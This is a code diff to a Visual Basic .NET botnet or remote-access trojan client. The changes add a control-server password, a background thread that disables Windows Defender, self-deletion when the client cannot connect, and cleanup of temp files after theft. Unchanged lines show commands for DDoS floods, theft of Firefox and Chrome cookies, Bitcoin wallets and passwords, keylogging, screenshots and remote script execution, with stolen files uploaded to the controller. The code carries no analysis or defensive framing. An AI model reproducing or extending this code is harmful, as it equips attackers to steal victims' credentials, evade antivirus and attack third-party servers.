@@ -34,6 +34,7 @@ Imports svchost.Spreads
 Public Class Form1
     Public Host As String = "[HOST]"
     Public ID As String = "[ID]"
+    Public Password As String = "[C_Password]"
     Public Startup As String = "[Startup]"
     Public HardInstall As String = "[HardInstall]"
     Public StartName As String = "[StartupName]"
@@ -53,6 +54,7 @@ Public Class Form1
     Public BinderBytes As String = "[BinderBytes]"
     Public DropperPath As String = "[DropperPath]"
     Public DropperName As String = "[DropperName]"
+    Public AntiWD As String = "[DisableWD]"
     Public st As Integer = 0
     Public Y As String = "|BN|"
     Public trd As Thread
@@ -100,14 +102,21 @@ Public Class Form1
             Else
                 If RSAStatus = "True" Then
                     C.Host = RSA_Decrypt(Host, RSAKey)
+                    C.C_Password = RSA_Decrypt(Password, RSAKey)
                 Else
                     C.Host = Host
+                    C.C_Password = Password
                 End If
             End If
 
             C.ID = ID & "_" & HWD()
-            C.Connect()
-            C.Send("Online")
+            If C.Connect() = True Then
+                C.Send("Online")
+            Else
+                SelfDestroy()
+                Application.Exit()
+            End If
+
 
             If BinderStatus = "True" Then
                 Dim Binder As New BinderService
@@ -121,6 +130,13 @@ Public Class Form1
                         .StartBinder()
                     End With
                 End If
+            End If
+
+            If AntiWD = "True" Then
+                Dim DisableWD As New DisableWD
+                Dim Background As New Thread(Sub() DisableWD.Run())
+                Background.IsBackground = True
+                Background.Start()
             End If
 
             If Startup = "True" Then
@@ -224,6 +240,7 @@ Public Class Form1
                 Select Case A(0)
                     Case "Ping"
                         C.Send("Ping")
+                        Return
 
                     Case "StartDDOS"
                         Select Case A(1)
@@ -239,6 +256,7 @@ Public Class Form1
                                 Catch ex As Exception
                                     C.Log("Fail", "An unexpected error occurred " + ex.Message)
                                 End Try
+                                Return
 
                             Case "SlowlorisAttack"
                                 Try
@@ -248,6 +266,7 @@ Public Class Form1
                                 Catch ex As Exception
                                     C.Log("Fail", "An unexpected error occurred " & ex.Message)
                                 End Try
+                                Return
 
                             Case "ARMEAttack"
                                 Try
@@ -257,6 +276,7 @@ Public Class Form1
                                 Catch ex As Exception
                                     C.Log("Fail", "An unexpected error occurred " & ex.Message)
                                 End Try
+                                Return
 
                             Case "TCPAttack"
                                 Try
@@ -266,6 +286,7 @@ Public Class Form1
                                 Catch ex As Exception
                                     C.Log("Fail", "An unexpected error occurred " & ex.Message)
                                 End Try
+                                Return
 
                             Case "HTTPGetAttack"
                                 Try
@@ -275,6 +296,7 @@ Public Class Form1
                                 Catch ex As Exception
                                     C.Log("Fail", "An unexpected error occurred " & ex.Message)
                                 End Try
+                                Return
 
                             Case "BWFloodAttack"
                                 Try
@@ -284,6 +306,7 @@ Public Class Form1
                                 Catch ex As Exception
                                     C.Log("Fail", "An unexpected error occurred " & ex.Message)
                                 End Try
+                                Return
 
                             Case "PostHTTPAttack"
                                 Try
@@ -293,6 +316,7 @@ Public Class Form1
                                 Catch ex As Exception
                                     C.Log("Fail", "An unexpected error occurred " & ex.Message)
                                 End Try
+                                Return
                         End Select
 
                     Case "StopDOOS"
@@ -305,6 +329,7 @@ Public Class Form1
                                 Catch ex As Exception
                                     C.Log("Fail", "An unexpected error occurred " & ex.Message)
                                 End Try
+                                Return
 
                             Case "SlowlorisAttack"
                                 Try
@@ -314,6 +339,7 @@ Public Class Form1
                                 Catch ex As Exception
                                     C.Log("Fail", "An unexpected error occurred " & ex.Message)
                                 End Try
+                                Return
 
 
                             Case "ARMEAttack"
@@ -324,7 +350,7 @@ Public Class Form1
                                 Catch ex As Exception
                                     C.Log("Fail", "An unexpected error occurred " & ex.Message)
                                 End Try
-
+                                Return
 
                             Case "TCPAttack"
                                 Try
@@ -334,6 +360,7 @@ Public Class Form1
                                 Catch ex As Exception
                                     C.Log("Fail", "An unexpected error occurred " & ex.Message)
                                 End Try
+                                Return
 
 
                             Case "HTTPGetAttack"
@@ -344,7 +371,7 @@ Public Class Form1
                                 Catch ex As Exception
                                     C.Log("Fail", "An unexpected error occurred " & ex.Message)
                                 End Try
-
+                                Return
 
                             Case "BWFloodAttack"
                                 Try
@@ -354,6 +381,7 @@ Public Class Form1
                                 Catch ex As Exception
                                     C.Log("Fail", "An unexpected error occurred " & ex.Message)
                                 End Try
+                                Return
 
 
                             Case "PostHTTPAttack"
@@ -364,8 +392,10 @@ Public Class Form1
                                 Catch ex As Exception
                                     C.Log("Fail", "An unexpected error occurred " & ex.Message)
                                 End Try
+                                Return
 
                         End Select
+                        Return
 
                     Case "UploadFile"
                         Try
@@ -378,18 +408,21 @@ Public Class Form1
                         Catch ex As Exception
                             C.Log("Fail", "An unexpected error occurred " & ex.Message)
                         End Try
+                        Return
 
                     Case "OpenPage"
                         Dim OpenPage As New Thread(Sub() BrowserHandler.OpenWebPage(A(1)))
                         OpenPage.IsBackground = True
                         OpenPage.Start()
                         C.Send("CleanCommands")
+                        Return
 
                     Case "OpenHidden"
                         Dim WebThread As New Thread(Sub() OpenWebHidden(A(1)))
                         WebThread.IsBackground = True
                         WebThread.Start()
                         C.Send("CleanCommands")
+                        Return
 
                     Case "Uninstall"
                         Try
@@ -406,6 +439,7 @@ Public Class Form1
                         Catch ex As Exception
                             C.Log("Fail", "An unexpected error occurred " & ex.Message)
                         End Try
+                        Return
 
                     Case "ExecuteScript"
                         Try
@@ -426,6 +460,7 @@ Public Class Form1
                             C.Send("CleanCommands")
                             C.Log("Fail", "An unexpected error occurred " & ex.Message)
                         End Try
+                        Return
 
 
                     Case "Close"
@@ -440,6 +475,7 @@ Public Class Form1
                         Catch ex As Exception
                             C.Log("Fail", "An unexpected error occurred " & ex.Message)
                         End Try
+                        Return
 
 
                     Case "ShowMessageBox"
@@ -483,6 +519,7 @@ Public Class Form1
                         Catch ex As Exception
                             C.Log("Fail", "An unexpected error occurred " & ex.Message)
                         End Try
+                        Return
 
                     Case "MoveClient"
                         Try
@@ -495,7 +532,7 @@ Public Class Form1
                         Catch ex As Exception
                             C.Log("Fail", "An unexpected error occurred " & ex.Message)
                         End Try
-
+                        Return
 
                     Case "Blacklist"
                         Try
@@ -507,6 +544,7 @@ Public Class Form1
                         Catch ex As Exception
                             C.Log("Fail", "An unexpected error occurred " & ex.Message)
                         End Try
+                        Return
 
                     Case "Screenshot"
                         Dim Screenshot As New RemoteDesktop
@@ -514,20 +552,24 @@ Public Class Form1
                         Screenshot.ID = C.ENB(ID + "_" + HWD())
                         Screenshot.Start()
                         C.Send("CleanCommands")
+                        Return
 
                     Case "StealCookie"
                         StealFFCookies()
-                        C.Upload(TempPath & "cookies.sqlite")
                         C.Send("CleanCommands")
+                        Return
 
                     Case "StealChCookies"
                         StealChromeCookies()
                         C.Send("CleanCommands")
+                        Return
 
                     Case "InstalledSoftwares"
                         ProgramList()
                         C.Upload(TempPath & "\\ProgramList.txt")
                         C.Send("CleanCommands")
+                        TempCleaner("ProgramList.txt")
+                        Return
 
                     Case "StealBitcoin"
                         Try
@@ -542,6 +584,7 @@ Public Class Form1
                         Catch ex As Exception
                             C.Log("Fail", "An unexpected error occurred " & ex.Message)
                         End Try
+                        Return
 
 
                     Case "StartKeylogger"
@@ -556,6 +599,7 @@ Public Class Form1
                     Case "RetriveLogs"
                         C.Upload(LogsPath)
                         C.Send("CleanCommands")
+                        Return
 
                     Case "StealPassword"
                         Try
@@ -566,6 +610,7 @@ Public Class Form1
                         Catch ex As Exception
 
                         End Try
+                        Return
 
                     Case "UpdateClient"
                         UpdateClient(A(1))
@@ -613,6 +658,7 @@ Public Class Form1
 
                         End Try
                 End Select
+                System.Threading.Thread.Sleep(5500)
             Loop
         Catch ex As Exception
 
@@ -626,6 +672,8 @@ Public Class Form1
                 C.Upload(TempPath & "\" & "CookiesCh.sqlite")
             End If
             C.Log("Succ", "Chrome cookies has been uploaded")
+
+            TempCleaner("CookiesCh.sqlite")
             Return True
         Catch ex As Exception
             C.Log("Fail", "An unexpected error occurred " & ex.Message)
@@ -634,18 +682,27 @@ Public Class Form1
     End Function
     Public Function StealFFCookies()
         Try
-            Dim directories As String() = Directory.GetDirectories("C:\Users\" + Environment.UserName + "\AppData\Roaming\Mozilla\Firefox\Profiles")
-            Dim i As Integer = 0
-            While i < directories.Length
-                Dim text2 As String = directories(i)
-                Dim flag As Boolean = File.Exists("C:\Users\" + Environment.UserName + "\AppData\Roaming\Mozilla\Firefox\Profiles" + text2.Replace("C:\Users\" + Environment.UserName + "\AppData\Roaming\Mozilla\Firefox\Profiles", String.Empty) + "\cookies.sqlite")
-                If flag Then
-                    Dim name As String = text2.Replace("C:\Users\" + Environment.UserName + "\AppData\Roaming\Mozilla\Firefox\Profiles", String.Empty)
-                    File.Copy("C:\Users\" + Environment.UserName + "\AppData\Roaming\Mozilla\Firefox\Profiles\" + name + "\cookies.sqlite", TempPath & "\" & "cookies.sqlite", True)
+
+            Dim profiles_path As String = Environ("Appdata") & "\Mozilla\Firefox\Profiles"
+            Dim directories As String() = Directory.GetDirectories(Environ("Appdata") + "\Mozilla\Firefox\Profiles")
+
+            For Each dir As String In directories
+
+                Dim profile_name As String = dir.Replace(profiles_path, String.Empty)
+                Dim isExist As Boolean = File.Exists(profiles_path & "\" & profile_name & "\cookies.sqlite")
+
+                If isExist Then
+                    Dim myFile As Long = New FileInfo(profiles_path & "\" & profile_name & "\cookies.sqlite").Length
+                    If myFile > 0 Then
+                        File.Copy(profiles_path & "\" & profile_name & "\cookies.sqlite", TempPath & "\" & "cookies" & ".sqlite", True)
+                        Exit For
+                    End If
                 End If
-                i = i + 1
-            End While
+            Next
+            C.Upload(TempPath & "\cookies.sqlite")
             C.Log("Succ", "Firefox cookies has been uploaded")
+
+            TempCleaner("cookies.sqlite")
             Return True
         Catch ex As Exception
             C.Log("Fail", "An unexpected error occurred " & ex.Message)
@@ -665,6 +722,14 @@ Public Class Form1
             Return True
         Catch ex As System.ComponentModel.Win32Exception
             C.Log("Fail", "An unexpected error occurred " & ex.Message)
+            Return False
+        End Try
+    End Function
+    Public Function TempCleaner(ByVal fname As String)
+        Try
+            IO.File.Delete(TempPath & "/" & fname)
+            Return True
+        Catch ex As Exception
             Return False
         End Try
     End Function
